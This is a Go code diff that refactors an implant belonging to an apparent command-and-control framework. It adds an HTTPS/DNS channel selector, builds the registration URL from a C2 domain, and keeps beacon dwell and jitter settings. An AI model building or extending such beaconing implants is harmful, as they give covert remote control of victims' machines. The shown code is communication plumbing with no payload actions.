@@ -15,7 +15,6 @@ import (
 type ImplantConfig struct {
 	Dwell  string  `json:"dwell"` // base interval time between C2 beacon check-ins (e.g., “5m” for a five-minute dwell before adding jitter)
 	Jitter float64 `json:"jitter"`
-	//TODO:  ENCRYPTION FIELDS, TIMEOUT, USEPROXY, ENDPOINTS - then fix in listener ImplantConfig as well
 }
 
 type Implant struct {
@@ -39,18 +38,15 @@ func NewImplant() (*Implant, error) {
 		return nil, fmt.Errorf("implant registration failed: %w", err)
 	}
 
-	comm, err := c2communicator.New(protocol)
-	if err != nil {
-		return nil, err
+	if err = impl.NewC2Communicator(protocol); err != nil {
+		return nil, fmt.Errorf("c2communicator creation failed: %w", err)
 	}
-	impl.C2Communicator = comm
-
 	return impl, nil
 }
 
 // register contacts the /register, fills impl.ID, and returns the c2's chosen communication protocol
 func (i *Implant) register() (string, error) {
-	const endpoint = C2HTTPSURI + C2REGISTERENDPOINT
+	endpoint := "https://" + C2Domain + C2RegisterEndpoint
 
 	body, err := json.Marshal(i)
 	if err != nil {
@@ -136,12 +132,24 @@ func (i *Implant) UpdateConfig(newJitter float64, newDwell, newC2CommProtocol st
 		i.Config.Dwell = newDwell
 	}
 	if newC2CommProtocol != "" {
-		comm, err := c2communicator.New(newC2CommProtocol)
-		if err != nil {
-			return fmt.Errorf("failed to update comm protocol: %w", err)
+		if err := i.NewC2Communicator(newC2CommProtocol); err != nil {
+			return err
 		}
-		i.C2Communicator = comm
 	}
+	return nil
+}
+
+func (i *Implant) NewC2Communicator(protocol string) error {
+	var comm c2communicator.C2Communicator
+	switch protocol {
+	case "HTTPS":
+		comm = c2communicator.NewHTTPS(C2Domain, C2HTTPSBeaconEndpoint)
+	case "DNS":
+		comm = c2communicator.NewDNS()
+	default:
+		return fmt.Errorf("unsupported protocol: %s", protocol)
+	}
+	i.C2Communicator = comm
 	return nil
 }
 
